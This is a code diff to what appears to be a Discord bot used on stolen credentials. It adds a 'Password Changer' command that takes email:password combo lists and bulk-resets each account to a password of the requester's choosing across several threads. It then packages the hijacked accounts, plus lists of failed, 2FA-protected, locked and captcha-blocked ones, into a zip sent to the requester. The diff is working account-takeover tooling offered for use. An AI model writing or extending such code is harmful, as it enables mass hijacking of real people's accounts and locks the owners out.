@@ -983,7 +983,115 @@ async function handleCountrySort(respond, userId, accountsRaw, accountsFile, thr
   }
 }
 
-// ── Admin Panel ─────────────────────────────────────────────
+// ── Password Changer ────────────────────────────────────────
+
+async function handleChange(respond, userId, newPassword, accountsRaw, accountsFile, threads = 3, dmUser = null) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
+
+  if (!newPassword || newPassword.length < 8) {
+    return respond({ embeds: [errorEmbed("New password must be at least 8 characters. Usage: `.change <newpass> <accounts>` or attach .txt")] });
+  }
+
+  const acquire = limiter.acquire(userId, "change");
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
+
+    const startTime = Date.now();
+    const msg = await respond({
+      embeds: [changerProgressEmbed({ completed: 0, total: accounts.length, changed: 0, failed: 0, elapsed: 0, username: dmUser?.username })],
+      components: [stopButton(userId)],
+      fetchReply: true,
+    });
+
+    let lastUpdate = Date.now();
+    let changedCount = 0, failedCount = 0;
+
+    const results = await changePasswords(
+      accounts,
+      newPassword,
+      threads,
+      (done, total, r) => {
+        if (r) {
+          if (r.success) changedCount++; else failedCount++;
+        }
+        const now = Date.now();
+        if (now - lastUpdate > 2500) {
+          lastUpdate = now;
+          updateProgress(msg, changerProgressEmbed({
+            completed: done, total, changed: changedCount, failed: failedCount,
+            elapsed: Date.now() - startTime,
+            latestAccount: r?.email || "",
+            latestStatus: r?.success ? "changed" : (r?.status || r?.error || "failed"),
+            username: dmUser?.username,
+          }), userId);
+        }
+      },
+      ac.signal
+    );
+
+    const stopped = ac.signal.aborted;
+    const elapsed = Date.now() - startTime;
+
+    const changed = results.filter((r) => r.success);
+    const failed  = results.filter((r) => !r.success);
+    const twoFA   = results.filter((r) => !r.success && /2fa|two.?factor|verification/i.test(r.error || r.status || ""));
+    const locked  = results.filter((r) => !r.success && /locked/i.test(r.error || r.status || ""));
+    const captcha = results.filter((r) => !r.success && /captcha/i.test(r.error || r.status || ""));
+
+    // Rebuild old-pass map for failed lines
+    const oldPassMap = new Map();
+    for (const a of accounts) {
+      const i = a.indexOf(":");
+      if (i !== -1) oldPassMap.set(a.substring(0, i), a.substring(i + 1));
+    }
+
+    const zipEntries = [];
+    if (changed.length > 0) {
+      zipEntries.push({ name: "changed.txt", content: changed.map((r) => `${r.email}:${newPassword}`).join("\n") });
+    }
+    if (failed.length > 0) {
+      zipEntries.push({ name: "failed.txt", content: failed.map((r) => `${r.email}:${oldPassMap.get(r.email) || ""} | ${r.error || r.status || "failed"}`).join("\n") });
+    }
+    if (twoFA.length > 0)   zipEntries.push({ name: "2fa.txt",     content: twoFA.map((r)   => `${r.email}:${oldPassMap.get(r.email) || ""}`).join("\n") });
+    if (locked.length > 0)  zipEntries.push({ name: "locked.txt",  content: locked.map((r)  => `${r.email}:${oldPassMap.get(r.email) || ""}`).join("\n") });
+    if (captcha.length > 0) zipEntries.push({ name: "captcha.txt", content: captcha.map((r) => `${r.email}:${oldPassMap.get(r.email) || ""}`).join("\n") });
+
+    const embed = changerFinalEmbed({
+      total: results.length, changed: changed.length, failed: failed.length,
+      twoFA: twoFA.length, locked: locked.length, captcha: captcha.length,
+      elapsed, username: dmUser?.username,
+    });
+    if (stopped) embed.setDescription((embed.data.description || "") + "\n\n*Stopped -- partial results*");
+
+    const { buildZipBuffer } = require("./utils/zip-builder");
+    const zipBuffer = buildZipBuffer(zipEntries);
+    const zipFile = new AttachmentBuilder(zipBuffer, { name: "changer_results.zip" });
+
+    if (dmUser) {
+      try {
+        await dmUser.send({ embeds: [embed], files: [zipFile] });
+        await msg.edit({ embeds: [infoEmbed("Password Changer Complete", `Changed ${changed.length}/${results.length} accounts. Results sent to your DMs.`)], components: [] });
+      } catch {
+        await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
+      }
+    } else {
+      await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
+    }
+
+    statsManager.record(userId, "change", changed.length);
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
+  } finally {
+    activeAborts.delete(userId);
+    limiter.release(userId);
+  }
+}
 
 async function handleAdminPanel(respond, callerId) {
   if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can view the admin panel.")] });
